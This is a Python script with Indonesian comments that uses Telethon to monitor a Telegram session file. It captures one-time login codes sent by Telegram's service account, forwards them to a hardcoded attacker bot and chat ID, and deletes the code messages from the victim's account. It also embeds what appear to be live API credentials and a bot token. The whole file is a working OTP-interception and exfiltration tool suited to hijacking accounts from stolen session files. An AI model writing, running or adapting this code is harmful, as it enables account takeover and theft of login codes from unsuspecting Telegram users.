import os
import re
import asyncio
import requests
from telethon import TelegramClient, events

# Ganti ini dengan milikmu
api_id = 23416622  # <-- ganti dengan api_id dari my.telegram.org
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'  # <-- ganti dengan api_hash dari my.telegram.org

# Token bot Telegram dan chat_id kamu
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
CHAT_ID = '7763955214'  # bisa didapat dari @userinfobot atau simpan saat start

# Lokasi session yang mau dipantau
SESSION_FOLDER = 'sessions'

# Regex OTP dari Telegram resmi (biasanya 5 atau 6 digit)
otp_pattern = re.compile(r'\b\d{5,6}\b')

async def monitor_session(session_name):
    session_path = os.path.join(SESSION_FOLDER, session_name)
    client = TelegramClient(session_path, api_id, api_hash)
    await client.start()
    print(f"[✓] Memantau session: {session_name}")

    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        msg = event.message.message
        otp_match = otp_pattern.search(msg)

        if otp_match:
            otp_code = otp_match.group()
            print(f"[OTP] {session_name} menerima OTP: {otp_code}")

            # Kirim OTP ke bot Telegram kamu
            send_to_bot(f"📬 OTP dari {session_name}: `{otp_code}`")

            # Opsional: hapus pesan OTP dari akun
            try:
                await event.delete()
                print(f"[✓] Pesan OTP dari 777000 dihapus.")
            except:
                print("[!] Gagal menghapus pesan OTP.")

    await client.run_until_disconnected()

def send_to_bot(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[!] Gagal kirim ke bot: {e}")

async def main():
    # Ambil semua session
    sessions = [f for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]

    # Ubah ke satu session saja (misalnya session yang sedang login manual)
    target_session = sessions[0]  # atau ganti ke '+62xxxxxx.session'

    await monitor_session(target_session)

if __name__ == '__main__':
    asyncio.run(main())
